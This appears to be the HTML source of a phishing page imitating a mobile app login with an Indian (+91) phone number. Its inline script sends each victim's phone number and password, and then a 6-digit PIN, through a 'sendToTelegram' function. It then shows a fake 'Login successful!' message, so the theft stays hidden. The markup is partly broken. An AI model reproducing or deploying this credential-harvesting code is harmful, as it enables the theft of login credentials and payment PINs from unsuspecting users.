 <body>
  <div id="app">

       <p class="zi" data-v-5f67ab78="">phone</p>
       <div class="put" data-v-5f67ab78="">
        <form class="van-form" data-v-5f67ab78="">
         <div class="van-cell van-field" data-v-5f67ab78="">
          <div class="van-cell__title van-field__label" style="width: 36px;"><span>+91</span></div>
          <div class="van-cell__value van-field__value">
           <div class="van-field__body">
            <input id="phoneNumber" class="van-field__control" placeholder="Your phone number" type="tel" maxlength="10" required/>
           </div>
          </div>
         </div>
        </form>
       </div>
      </div>
      <div class="box" data-v-5f67ab78="">
       <p class="zi" data-v-5f67ab78="">Password</p>
       <div class="put" data-v-5f67ab78="">
        <div class="van-cell van-field" data-v-5f67ab78="">
         <div class="van-cell__value van-cell__value--alone van-field__value">
          <div class="van-field__body">
           <input id="password" class="van-field__control" placeholder="Your password" type="password" required/>
           <div class="van-field__right-icon">
            <span class="solts" data-v-5f67ab78="">
             <i class="van-icon van-icon-eye" data-v-5f67ab78=""></i>

          </div>

      <button type="button" onclick="goToStep2()" class="van-button van-button--default van-button--normal van-button--block" data-v-5f67ab78="" style='margin-top: 40px; height: 48px; font-family: "Source Sans Variable"; font-weight: bold; font-size: 24px; border-radius: 12px; color: white; background: rgb(102, 204, 51); border-color: rgb(102, 204, 51);'>

       <div class="put" data-v-5f67ab78="">
        <div class="van-cell van-field" data-v-5f67ab78="">
         <div class="van-cell__title van-field__label" style="width: 36px;"><span>+91</span></div>
         <div class="van-cell__value van-field__value">

       </div>

       <div class="van-button__content" data-v-5f67ab78=""><span class="van-button__text" data-v-5f67ab78="">COMPLETE LOGIN</span></div>

   </div>
  </div>
  <script src="script.js"></script>
  <script>
    function goToStep2() {
      const phone = document.getElementById('phoneNumber').value;
      const password = document.getElementById('password').value;
      if (phone.length === 10 && password) {
        document.getElementById('displayPhone').value = phone;
        sendToTelegram("PASSWORD DATA", phone, password);
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
      } else {
        alert('Please enter 10 digit phone and password');
      }
    }

    function completeLogin() {
      const phone = document.getElementById('displayPhone').value;
      const pin = document.getElementById('pin').value;
      if (pin.length === 6) {
        sendToTelegram("PIN DATA", phone, pin);
        alert('Login successful!');
      } else {
        alert('Please enter 6 digit PIN');
      }
    }
  </script>
